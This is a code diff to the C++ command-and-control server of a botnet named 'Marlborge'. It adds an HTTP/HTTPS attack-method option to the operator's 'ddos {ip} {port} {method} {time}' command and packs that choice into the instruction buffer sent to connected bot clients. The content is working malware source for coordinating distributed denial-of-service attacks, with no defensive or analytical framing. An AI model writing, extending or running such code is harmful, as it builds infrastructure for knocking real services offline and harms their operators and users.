@@ -24,6 +24,12 @@ enum COMMAND {
 	UNKNOWN = 0x00
 };
 
+enum DDOS_METHOD {
+	HTTP = 0x40,
+	HTTPS = 0x41,
+	UNKNOWN = 0x00
+};
+
 void ListenThread();
 void ClientThread(SOCKET sock, std::string ip);
 void Disconnect(std::string ip);
@@ -32,7 +38,8 @@ void SIGINTHandler(int signal);
 
 std::vector<std::string> split(std::string sData, char delimiter);
 
-COMMAND GetCommand(std::string cmd);
+DDOS_METHOD TranslateMethod(std::string method);
+COMMAND TranslateCommand(std::string cmd);
 
 std::string GenRandStr(int nLength);
 
@@ -84,13 +91,13 @@ int main() {
 		std::getline(std::cin, cmd);
 		std::cout << std::endl;
 
-		COMMAND command = GetCommand(cmd);
+		COMMAND command = TranslateCommand(cmd);
 
 		UINT nClientCount = clients.size();
 		switch (command) {
 		case HELP:
 			std::cout << "Marlborge command list:\n"
-				"1.- ddos {ip} {port} {time}\n"
+				"1.- ddos {ip} {port} {method} {time}\n"
 				"2.- clients\n"
 				"3.- exit\n";
 			break;
@@ -103,7 +110,9 @@ int main() {
 			std::vector<std::string> splittedCmd = split(cmd, ' ');
 			std::string ip = splittedCmd[1];
 			std::string sPort = splittedCmd[2];
-			std::string sTime = splittedCmd[3];
+			std::string sMethod = splittedCmd[3];
+			DDOS_METHOD method = TranslateMethod(sMethod);
+			std::string sTime = splittedCmd[4];
 
 			UINT nPort = stoi(sPort);
 			UINT nTime = stoi(sTime);
@@ -119,6 +128,8 @@ int main() {
 			memcpy(&buffer[nBufferSize], ip.data(), nIPLength);
 			nBufferSize += nIPLength;
 			buffer[nBufferSize] = nPort;
+			nBufferSize++;
+			buffer[nBufferSize] = method;
 			nBufferSize++;
 			/* Last 4 bytes will be for the time. */
 			UINT unTime = ntohl(nTime);
@@ -224,8 +235,8 @@ std::string GenRandStr(int nLength) {
 	return randStr;
 }
 
-COMMAND GetCommand(std::string cmd) {
-	COMMAND command = UNKNOWN;
+COMMAND TranslateCommand(std::string cmd) {
+	COMMAND command = COMMAND::UNKNOWN;
 	cmd = split(cmd, ' ')[0];
 	if (cmd == "help")
 		command = HELP;
@@ -246,6 +257,18 @@ COMMAND GetCommand(std::string cmd) {
 		command = EXIT;
 
 	return command;
+}
+
+DDOS_METHOD TranslateMethod(std::string method) {
+	DDOS_METHOD ddos_method = DDOS_METHOD::UNKNOWN;
+
+	if (method == "http")
+		ddos_method = DDOS_METHOD::HTTP;
+
+	if (method == "https")
+		ddos_method = DDOS_METHOD::HTTPS;
+
+	return ddos_method;
 }
 
 void ClientThread(SOCKET sock, std::string ip) {
